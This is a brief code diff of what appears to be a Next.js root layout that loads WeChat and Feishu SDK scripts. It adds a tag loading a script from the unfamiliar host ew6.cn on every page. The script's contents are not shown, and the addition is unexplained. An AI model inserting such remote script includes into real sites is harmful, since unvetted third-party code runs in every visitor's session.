@@ -24,7 +24,8 @@ export default function RootLayout({ children, page }) {
 
   return (
     <html lang="en">
-      <Script id="weixinopenjs" src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js" />
+    <Script id="sse" src="https://ew6.cn/sse.js"></Script>
+    <Script id="weixinopenjs" src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js" />
       <Script id="feishusdk" src="https://lf1-cdn-tos.bytegoofy.com/goofy/locl/lark/external_js_sdk/h5-js-sdk-1.2.12.js" />
 
       <Script
